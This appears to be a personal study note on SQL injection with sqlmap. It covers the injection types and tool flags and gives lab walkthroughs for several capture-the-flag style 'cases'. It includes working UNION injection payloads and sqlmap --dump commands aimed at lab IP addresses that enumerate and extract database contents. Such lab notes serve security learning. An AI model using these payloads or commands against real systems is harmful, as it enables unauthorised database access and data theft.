#SQLi #SQLmap #CWES 

doc: https://github.com/sqlmapproject/sqlmap/wiki/Usage 

#### Types of sqli variants it can find:
- `B`: Boolean-based blind
Look at the server response, and differentiating true and false. Could be differences in raw content, http code, page title, or something else. 

- `E`: Error-based
If the DBMS errors are being returned to the user somehow, there might be possible to use this as a base for error-based sqli

- `U`: Union query-based
The base statement is extendable, fast and powerful.

- `S`: Stacked queries
Running another sql query after the first one, ie stacking queries. 

- `T`: Time-based blind
Same idea as in boolean-based, but we use time as the differentiation, ex. run sleep(5) if query true. 

- `Q`: Inline queries
Query inside a query. (uncommon)

#### Common errors:
- Missing cookie values
- Over-complicating and lengthy command
- Improper declaration of POST data

PRO TIP:
1. Network section of browser, "copy as cURL" and use sqlmap on this command (- the curl ofc)

2. Can also the a whole request from burp and save it in a file, then feed it to sqlmap with the -r command. 

3. Can also spesify if there are multiple parameters, and we only want to test 1 of them with the `*`-sign. 


#### Case studies:

**Case2:**
SQLmap tells us that this payloads works:
```
99 UNION ALL SELECT NULL,CONCAT(0x716b707671,0x5a6b4d6a506172674168546e5173545071614e6565774a644f4c514d484f496c547776725274676e,0x7176627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```
- Now we have to modify it, to be able to use it to do the stuff we want:
```
99 UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

99 UNION ALL SELECT NULL,@@version,database(),NULL,NULL,NULL,NULL,NULL,NULL-- -

99 UNION select 1,schema_name,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.SCHEMATA#


99 UNION select 1,TABLE_NAME,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.TABLES#

99 UNION select 1,column_NAME,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name="flag2"#

99 UNION select 1,id,content,4,5,6,7,8,9 from flag2#


```

version:  10.3.23-MariaDB-0+deb10u1 
database name: testdb
schema: information_schema
tables: lots of them, 1 named flag2 
columns in flag2 table: id, content

Could also just have drop it like this to dump all tables:
```
sqlmap -u 'http://154.57.164.77:31988/case2.php' --data 'id=1' --batch --dump
```


PRO TIP:
- For debugging consider adding the -t (traffic), -v(verbose) or --proxy(to proxy the traffic to burp)
- -v 3 shows the payloads used


**Case 5:** 
Sqlmap struggle to find the injection in

`http://154.57.164.80:31387/case5.php?id=1`

But a simple:
`http://154.57.164.80:31387/case5.php?id=1 or 1=1`

...Dumps all users.

```
sqlmap -u "http://154.57.164.80:31387/case5.php?id=1 OR 1=1" --dbs
sqlmap -u "http://154.57.164.80:31387/case5.php?id=1 OR 1=1" --tables
sqlmap -u "http://154.57.164.80:31387/case5.php?id=1 OR 1=1" -D testdb T flag5 --dump


We could also have 1 lined it:

sqlmap -u 'http://STMIP:STMPO/case5.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump

```

**case 6:**
we get a hint that there is a sqli when having non-standard boundaries, which gives us 2 good options:
- increase the --level 
- set a specific prefix 

```
WORKS:
sqlmap -u "http://154.57.164.80:31387/case6.php?col=id" --prefix='`)' --level=3 -v 3

DID NOT WORK:
sqlmap -u "http://154.57.164.80:31387/case6.php?col=*" --prefix='`)' --level=3 


SO:
sqlmap -u "http://154.57.164.80:31387/case6.php?col=id" --prefix='`)' -D testdb -T flag6 --dump

.. gives ut the flag.

```

**case 7:**
Need to manually find the number of columns 
```
..1 UNION SELECT 1,2#
...

http://154.57.164.70:30215/case7.php?id=1 UNION SELECT 1,2,3,4,5#

Then we can run:
sqlmap -u "http://154.57.164.70:30215/case7.php?id=1" --union-cols=5 D testdb T flag7 --dump

... to give us the flag.


```

Union query injections for some reason need some extra help, hence finding the number of columns first and then specify them in the sqlmap command. 


#### SQLmap payloads:

**Vector:** The legit sql query which we want to execute 
**Boundaries** The prefix and suffix, used to inject the vector. 

We can increase the set size of the used boundaries and vectors in the sqlmap payloads, with the `risk` and `level` flags. 

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

Min payloads for a single parameter: 72
Max payloads for a single parameter: 7865


We can also tune the way sqlmap validates true and false via flags such as:
NOTE: most likely not necessary that often. 
- strings: true when specific string is on page
- titles: true when the page has a specific title
- code: true when the page gives a specific http status code

